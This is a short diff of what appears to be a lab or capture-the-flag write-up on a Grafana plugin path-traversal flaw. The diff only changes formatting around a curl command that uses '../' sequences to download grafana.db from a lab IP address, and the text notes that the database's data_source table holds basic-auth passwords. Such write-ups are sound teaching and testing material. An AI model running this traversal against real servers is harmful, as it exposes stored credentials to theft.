@@ -68,9 +68,8 @@ After searching for exploits in github, i stumbled upon [https://github.com/jas5
 
 So using curl download the grafana.db file
 
-<code style="background:black">
-curl --path-as-is http://192.168.146.142:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
-</code>
+<div class="language-bash"><div class="highlight"><pre class="highlight"><code>curl --path-as-is http://192.168.146.142:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+</code></pre></div></div>
 
 Going through the database there is `data_source` table which contains basic_auth_user and secure_json_data which has basicAuthPassword
 
